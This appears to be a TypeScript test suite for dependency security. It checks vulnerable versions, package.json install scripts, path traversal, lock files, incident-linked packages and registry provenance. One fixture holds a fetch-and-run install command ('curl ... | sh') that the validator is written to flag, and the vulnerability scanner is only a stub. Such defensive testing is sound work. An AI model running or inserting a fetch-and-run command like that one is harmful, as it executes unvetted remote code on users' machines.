/// <reference types="bun" />

import { describe, expect, test } from 'bun:test';

describe('Dependency Security Tests', () => {
  test('should check for known vulnerable dependencies', async () => {
    // This would typically integrate with a vulnerability scanner
    // For now, we'll mock the functionality
    
    const checkVulnerabilities = async (dependencyTree: any) => {
      // Simulated vulnerability check
      const vulnerabilities = [];
      
      // In a real implementation, this would call npm audit or similar
      // For demonstration, we'll return empty array
      return vulnerabilities;
    };
    
    const mockDependencies = {
      'react': '^18.2.0',
      'electron': '^25.0.0',
      '@types/node': '^20.0.0'
    };
    
    const vulns = await checkVulnerabilities(mockDependencies);
    expect(vulns).toHaveLength(0);
  });

  test('should validate dependency versions against known issues', () => {
    const checkVersionSecurity = (packageName: string, version: string) => {
      const knownVulnerableVersions: Record<string, string[]> = {
        'lodash': ['4.17.4', '4.17.11'],
        'moment': ['2.18.1', '2.19.3'],
        'serialize-javascript': ['2.1.1', '3.1.0'],
        'ejs': ['3.1.5', '3.1.6'],
        'axios': ['0.21.1', '0.27.2']
      };
      
      if (knownVulnerableVersions[packageName]?.includes(version)) {
        return { isVulnerable: true, version };
      }
      
      return { isVulnerable: false, version };
    };
    
    expect(checkVersionSecurity('lodash', '4.17.21').isVulnerable).toBe(false);
    expect(checkVersionSecurity('lodash', '4.17.4').isVulnerable).toBe(true);
    expect(checkVersionSecurity('moment', '2.29.4').isVulnerable).toBe(false);
    expect(checkVersionSecurity('moment', '2.18.1').isVulnerable).toBe(true);
  });

  test('should validate package integrity', () => {
    const validatePackageIntegrity = (pkg: any) => {
      const issues: string[] = [];
      
      // Check for common security issues in package.json
      if (pkg.scripts?.install?.includes('curl') && pkg.scripts.install.includes('| sh')) {
        issues.push("Install script contains unsafe curl | sh pattern");
      }
      
      if (pkg.scripts?.postinstall?.includes('node') && pkg.scripts.postinstall.includes('/tmp/')) {
        issues.push("Postinstall script accesses temporary directories");
      }
      
      if (pkg.bin && typeof pkg.bin === 'string' && pkg.bin.includes('..')) {
        issues.push("Binary path contains path traversal");
      }
      
      if (pkg.main?.includes('..') || pkg.module?.includes('..')) {
        issues.push("Main/module path contains path traversal");
      }
      
      return {
        isValid: issues.length === 0,
        issues,
      };
    };
    
    expect(validatePackageIntegrity({
      name: 'safe-package',
      version: '1.0.0',
      main: './index.js',
      scripts: { test: 'jest' }
    }).isValid).toBe(true);
    
    expect(validatePackageIntegrity({
      name: 'unsafe-package',
      version: '1.0.0',
      main: '../index.js',
      scripts: { install: 'curl -sSL https://example.com/install.sh | sh' }
    }).isValid).toBe(false);
  });

  test('should validate lock file consistency', () => {
    const validateLockFile = (packageJson: any, lockFile: any) => {
      const issues: string[] = [];
      
      // Check if dependencies in package.json match lock file
      if (packageJson.dependencies) {
        for (const [depName, depVersion] of Object.entries(packageJson.dependencies)) {
          // In a real implementation, we'd check if the resolved version in lock file matches
          // For now, we'll just check if the dependency exists in lock file
          if (!lockFile.dependencies?.[depName]) {
            issues.push(`Dependency ${depName} not found in lock file`);
          }
        }
      }
      
      return {
        isValid: issues.length === 0,
        issues,
      };
    };
    
    expect(validateLockFile(
      { dependencies: { react: '^18.0.0' } },
      { dependencies: { react: { version: '18.2.0' } } }
    ).isValid).toBe(true);
    
    expect(validateLockFile(
      { dependencies: { react: '^18.0.0', lodash: '^4.17.0' } },
      { dependencies: { react: { version: '18.2.0' } } }
    ).isValid).toBe(false);
  });

  test('should validate third-party module security', () => {
    const validateThirdPartyModule = (moduleName: string, modulePath: string) => {
      const issues: string[] = [];
      
      // Check for common malicious patterns in module names/paths
      if (moduleName.includes('oauth') && moduleName.includes('login')) {
        // Additional validation might be needed
      }
      
      if (modulePath.includes('node_modules/.bin/') && modulePath.includes('..')) {
        issues.push("Module path contains path traversal in bin directory");
      }
      
      // Check for modules with suspicious names
      const suspiciousNames = [
        'event-stream', // Known incident
        'colors',       // Known incident
        'faker',        // Known incident
        'coa',          // Known incident
        'rc'            // Known incident
      ];
      
      if (suspiciousNames.includes(moduleName)) {
        issues.push(`Module ${moduleName} has been associated with security incidents`);
      }
      
      return {
        isValid: issues.length === 0,
        issues,
      };
    };
    
    expect(validateThirdPartyModule('react', 'node_modules/react/index.js')).toEqual({ 
      isValid: true, 
      issues: [] 
    });
    
    expect(validateThirdPartyModule('event-stream', 'node_modules/event-stream/index.js')).toEqual({ 
      isValid: false, 
      issues: ["Module event-stream has been associated with security incidents"] 
    });
  });

  test('should validate transitive dependencies', () => {
    const validateTransitiveDeps = (deps: Record<string, any>) => {
      const issues: string[] = [];
      
      // Check for overly permissive dependencies
      for (const [name, config] of Object.entries(deps)) {
        if (config.version === '*') {
          issues.push(`Dependency ${name} has wildcard version which is unsafe`);
        }
        
        if (config.version?.startsWith('latest')) {
          issues.push(`Dependency ${name} uses 'latest' tag which is unsafe`);
        }
      }
      
      return {
        isValid: issues.length === 0,
        issues,
      };
    };
    
    expect(validateTransitiveDeps({
      react: { version: '^18.0.0' },
      lodash: { version: '~4.17.21' }
    }).isValid).toBe(true);
    
    expect(validateTransitiveDeps({
      react: { version: '*' },
      lodash: { version: 'latest'
    }
  }).isValid).toBe(false);
});

  test('should validate package signing and provenance', () => {
    const validatePackageSigning = (packageName: string, metadata: any) => {
      const issues: string[] = [];
      
      // Check for package signing information
      if (!metadata._integrity) {
        issues.push(`Package ${packageName} lacks integrity checksum`);
      }
      
      if (!metadata._resolved) {
        issues.push(`Package ${packageName} lacks resolved URL`);
      }
      
      // Check if resolved URL uses HTTPS
      if (metadata._resolved && !metadata._resolved.startsWith('https://')) {
        issues.push(`Package ${packageName} resolved from non-HTTPS source`);
      }
      
      return {
        isValid: issues.length === 0,
        issues,
      };
    };
    
    expect(validatePackageSigning('safe-package', {
      _integrity: 'sha512-...',
      _resolved: 'https://registry.npmjs.org/safe-package/-/safe-package-1.0.0.tgz'
    })).toEqual({ isValid: true, issues: [] });
    
    expect(validatePackageSigning('unsafe-package', {
      _resolved: 'http://registry.example.com/unsafe-package/-/unsafe-package-1.0.0.tgz'
    })).toEqual({ 
      isValid: false, 
      issues: [
        "Package unsafe-package lacks integrity checksum",
        "Package unsafe-package resolved from non-HTTPS source"
      ] 
    });
  });
});